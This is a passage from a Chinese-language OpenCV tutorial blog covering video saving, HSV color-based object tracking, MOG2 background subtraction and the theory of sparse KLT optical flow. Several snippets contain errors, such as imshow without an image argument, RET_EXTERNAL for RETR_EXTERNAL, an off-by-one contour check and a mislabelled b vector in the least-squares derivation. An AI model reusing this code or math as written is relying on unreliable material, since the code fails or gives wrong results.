frame;</span><br><span class="line"><span class="function">VideoWriter <span class="title">writer</span><span class="params">(<span class="string">&quot;./res.mp4&quot;</span>,type,fps,Size(width,height),<span class="literal">true</span>)</span></span>;<span class="comment">//是否是彩色</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">  <span class="keyword">bool</span> ret = capture.read(frame);</span><br><span class="line">  <span class="keyword">if</span>(!ret)<span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//写入</span></span><br><span class="line">  writer.write(frame);</span><br><span class="line">  imshow(<span class="string">&quot;frame&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> c=waitKey(<span class="number">50</span>);</span><br><span class="line">  <span class="keyword">if</span>(c==<span class="number">27</span>)<span class="keyword">break</span>; <span class="comment">//esc则退出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>opencv对于保存的限制，文件大小最好不要超过2GB</li><li>最好是保存到一定大小后，再新建文件保存。</li></ul><h3 id="析构"><a class="markdownIt-Anchor" href="#析构"></a> 析构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">capture.release();</span><br><span class="line">writer.release();</span><br></pre></td></tr></table></figure><h1 id="跟踪"><a class="markdownIt-Anchor" href="#跟踪"></a> 跟踪</h1><h2 id="基于颜色的对象跟踪"><a class="markdownIt-Anchor" href="#基于颜色的对象跟踪"></a> 基于颜色的对象跟踪</h2><ul><li>基于HSV色彩空间，跟踪一个红色的物体</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//打开视频文件获取frame</span></span><br><span class="line">Mat hsv,mask;</span><br><span class="line">cvtColor(frame,hsv,COLOR_BGR2HSV);</span><br><span class="line"><span class="comment">//获取红色HSV对应的色彩范围</span></span><br><span class="line">inRange(hsv,Scalar(<span class="number">0</span>,<span class="number">43</span>,<span class="number">46</span>),Scalar(<span class="number">10</span>,<span class="number">255</span>,<span class="number">255</span>),mask);</span><br><span class="line"><span class="comment">//处理一下图像的缺失空洞</span></span><br><span class="line">Mat se=getStructuringElement(MORPH_RECT,Size(<span class="number">15</span>,<span class="number">15</span>));</span><br><span class="line">morphologyEx(mask,mask,MORPH_OPEN,se);</span><br><span class="line"><span class="comment">//获取轮廓</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;Point&gt;&gt;contours;</span><br><span class="line"><span class="built_in">vector</span>&lt;Vec4i&gt;hierarchy;</span><br><span class="line">findContours(mask,contours,hierarchy,RET_EXTERNAL,CHAIN_APPROX_SIMPLE,Point());</span><br><span class="line"><span class="comment">//drawContours(frame,contours,-1,Scalar(0,0,255),2,8);</span></span><br><span class="line"><span class="comment">//求最大面积的外接轮廓</span></span><br><span class="line"><span class="keyword">int</span> index=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">double</span> max_area=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">size_t</span> t=<span class="number">0</span>;t&lt;contours.size();t++)&#123;</span><br><span class="line">  <span class="keyword">double</span> area=contourArea(contours[t]);</span><br><span class="line">  <span class="keyword">double</span> len=arcLength(contours[t],<span class="literal">true</span>);</span><br><span class="line">  <span class="comment">//if(area&lt;100||len&lt;10)continue;</span></span><br><span class="line">  <span class="comment">//Rectbox=boundingRect(contours[t]);</span></span><br><span class="line">  <span class="comment">//drawContours(src,contours,t,Scalar(0,0,255),2,8);</span></span><br><span class="line">  <span class="keyword">if</span>(max_area&lt;area)&#123;</span><br><span class="line">    index=t;max_area=area;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(index&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  RotatedRect rrt=minAreaRect(contours[index]);</span><br><span class="line">  ellipse(frame,rrt,Scalar(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">  circle(frame,rrt.center,<span class="number">4</span>,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">imshow(<span class="string">&quot;detection&quot;</span>,frame)</span><br></pre></td></tr></table></figure><h2 id="基于背景分析的对象跟踪"><a class="markdownIt-Anchor" href="#基于背景分析的对象跟踪"></a> 基于背景分析的对象跟踪</h2><ul><li><p>视频和图片的区别是视频具有连续性，每一帧相互之间有上下文的关系。合理利用前面的信息，对未来帧走势做出建模。</p></li><li><p>常用的方法</p><ol><li>KNN</li><li>GMM</li><li>Fuzzy lntegral模糊积分</li></ol></li><li><p>KNN、GMM对前景和背景进行像素级别的分割(某个像素只能是背景和前景)，模糊积分会得到像素背景和前景的概率</p></li><li><p>GMM是基于高斯和最大似然，计算马氏距离，在一定范围内，判断当前像素是否是前景。如果大于，则会新增高斯权重模型，模型就新增一个组件，当组件满了，丢弃最开始的。这样模型就动态的更新和维护。</p></li></ul><h3 id="代码实现-17"><a class="markdownIt-Anchor" href="#代码实现-17"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建建模对象</span></span><br><span class="line"><span class="comment">//500帧进行背景和建模,马氏距离,是否检测阴影(置为true速度会比较慢),,,,</span></span><br><span class="line"><span class="keyword">auto</span> pMOG2 = createBackgroundSubtractorMOG2(<span class="number">500</span>,<span class="number">16</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//如果想过滤变动不大的目标，可以将马氏距离设置很大</span></span><br><span class="line">Mat mask,bg_image;</span><br><span class="line">pMOG2-&gt;apply(frame,mask);</span><br><span class="line">pMOG2-&gt;getBackgroundImage(frame,mask);</span><br></pre></td></tr></table></figure><h2 id="光流法"><a class="markdownIt-Anchor" href="#光流法"></a> 光流法</h2><ul><li>光流可以看成是图像结构光的变化或者图像亮度模式明显的移动</li><li>光流法分为：稀疏光流KLT与稠密光流</li><li>基于相邻视频帧进行分析</li><li>光流对光照变化很敏感，一般需要进行模糊</li></ul><h3 id="稀疏光流klt"><a class="markdownIt-Anchor" href="#稀疏光流klt"></a> 稀疏光流KLT</h3><ul><li>假设条件：1、亮度恒定；2、近距离移动；3、空间一致；</li><li>亮度恒定：假设x,y像素点移动了u,v，那么两个像素值应该相等</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>u</mi><mo separator="true">,</mo><mi>y</mi><mo>+</mo><mi>v</mi><mo separator="true">,</mo><mi>t</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x,y,t)=I(x+u,y+v,t+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><ul><li>空间一致：假设窗口大小为5*5个像素点，基于亮度恒定，移动u,v</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>=</mo><msub><mi>I</mi><mi>t</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi mathvariant="normal">∇</mi><mi>I</mi><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">⋅</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>u</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>v</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">O=I_t(p_i)+\nabla I(p_i)·\begin{bmatrix}u  &amp;v\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="mord">∇</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">u</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><ul><li>根据空间一致性，求取移动的u,v，可以使用最小二乘法求d</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>d</mi><mo>=</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">Ad=b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>A</mi><mi>T</mi></msup><mi>A</mi><mo stretchy="false">)</mo><mi>d</mi><mo>=</mo><msup><mi>A</mi><mi>T</mi></msup><mi>b</mi></mrow><annotation encoding="application/x-tex">(A^TA)d=A^Tb</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mclose">)</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8913309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">b</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>I</mi><mi>x</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>I</mi><mi>y</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>I</mi><mi>x</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mn>25</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>I</mi><mi>y</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mn>25</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">A=\begin{bmatrix}I_x(p_1)  &amp;I_y(p_1) \\...  &amp;... \\I_x(p_{25})  &amp;I_y(p_{25}) \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>I</mi><mi>x</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>I</mi><mi>x</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mn>25</mn></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">b=\begin{bmatrix}I_x(p_1)   \\... \\ I_x(p_{25})    \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>u</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>v</mi></mstyle></mtd></mtr></mtable><mo 